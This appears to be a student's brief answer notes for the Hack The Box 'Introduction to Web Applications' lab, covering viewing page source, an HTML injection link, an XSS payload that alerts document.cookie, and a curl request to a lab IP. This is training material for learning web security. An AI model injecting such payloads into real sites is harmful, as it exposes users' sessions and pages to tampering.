# Introduction to Web Applications

## Sensitive Data Exposure

go to the IP address url and press 'ctl+u' to see the source code

## HTML Injection

Insert the following in the input box: 

```
<a href="http://www.hackthebox.com">Click Me</a>
```


## Cross-Site Scripting (XSS)


Insert the following in the input box: 

```
#"><img src=/ onerror=alert(document.cookie)>
```

## Development Frameworks & APIs

```
curl -X GET 188.166.172.138:31319/index.php?id=1
```

